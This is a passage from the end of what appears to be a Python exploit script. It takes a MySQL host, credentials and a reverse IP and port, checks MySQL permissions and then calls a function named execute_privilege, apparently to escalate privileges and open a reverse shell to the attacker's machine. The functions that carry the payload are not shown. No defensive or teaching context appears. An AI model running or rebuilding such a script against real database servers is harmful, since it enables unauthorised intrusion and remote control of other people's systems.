        print("Usage: python script.py <host> <port> <user> <password> <reverse_ip> <reverse_port>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    user = sys.argv[3]
    password = sys.argv[4]
    reverse_ip = sys.argv[5]
    reverse_port = sys.argv[6]

    if path := check_mysql_permissions(host, port, user, password):
        execute_privilege(host, port, user, password, reverse_ip, reverse_port, path)
